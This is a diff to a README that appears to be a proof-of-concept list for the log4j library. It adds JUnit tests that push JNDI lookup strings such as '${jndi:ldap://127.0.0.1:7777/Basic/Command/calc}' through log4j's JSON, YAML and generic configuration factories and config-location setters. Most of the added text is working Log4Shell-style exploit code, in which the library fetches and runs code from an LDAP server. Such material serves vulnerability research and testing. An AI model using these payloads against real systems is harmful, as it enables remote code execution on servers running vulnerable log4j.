@@ -133,3 +133,86 @@ This projects is a poc list for *log4j* java library, which extends default poc 
         action.execute();
     }
 ```
+
+## Pocs for Config Tree ##
+
+**JSONConfigurationFactory.getConfiguration()**
+```
+ @Test
+    public void getConfigurationJSONConfigurationFactoryTest() throws IOException {
+        String jsonConfig = "{\"injectedObject\": {\"injectedProperty\":\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"}}";
+        ByteArrayInputStream bis = new ByteArrayInputStream(jsonConfig.getBytes(StandardCharsets.UTF_8));
+        ConfigurationSource source = new ConfigurationSource(bis);
+
+        JsonConfigurationFactory factory = new JsonConfigurationFactory();
+        Configuration config = factory.getConfiguration(new LoggerContext("testContext"), source);
+    }
+```
+
+**LoggerContext.setConfigLocation()**
+```
+@Test
+    public void setConfigLocationUriTest()  {
+        URI configUri = new File("config.json").toURI();
+        LoggerContext context = (LoggerContext) LogManager.getContext(false);
+        context.setConfigLocation(configUri);
+    }
+```
+
+**ConfigurationFactory.getConfiguration()**
+
+Required dedpendecies
+```
+implementation("com.fasterxml.jackson.core:jackson-databind:2.17.0")
+```
+
+```
+ @Test
+    public void getConfigurationConfigurationFactoryTest() throws IOException {
+        String configText = "{"
+                + "\"Configuration\": {"
+                + "    \"injectedProperty\": \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\""
+                + "}"
+                + "}";
+        ByteArrayInputStream bis = new ByteArrayInputStream(configText.getBytes(StandardCharsets.UTF_8));
+        ConfigurationSource source = new ConfigurationSource(bis, new File("config.json"));
+        Configuration config = ConfigurationFactory.getInstance().getConfiguration(new LoggerContext("testContext"), source);
+    }
+```
+
+**YamlConfigurationFactory.getConfiguration**
+
+Required dedpendecies
+```
+implementation("com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.17.1")
+```
+
+```
+@Test
+    public void getConfigurationYamlConfigurationFactoryTest() throws IOException {
+        String yamlConfig = "Configuration:\n" +
+                "  injectedProperty: \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"";
+        ByteArrayInputStream bis = new ByteArrayInputStream(yamlConfig.getBytes(StandardCharsets.UTF_8));
+        ConfigurationSource source = new ConfigurationSource(bis);
+
+        YamlConfigurationFactory factory = new YamlConfigurationFactory();
+        Configuration config = factory.getConfiguration(new LoggerContext("testContext"), source);
+    }
+```
+
+**LoggerContextAdminMBean.setConfigLocationUri**
+
+```
+    @Test
+    public void setConfigLocationUriLoggerContextAdminMBeanTest() throws Exception {
+        LoggerContext context = new LoggerContext("testContext");
+        LoggerContextAdminMBean mBean = new LoggerContextAdmin(context, new Executor() {
+            @Override
+            public void execute(Runnable command) {
+                command.run();
+            }
+        });
+        URI newConfigUri = new File("config.json").toURI();
+        mBean.setConfigLocationUri(newConfigUri.toString());
+    }
+```
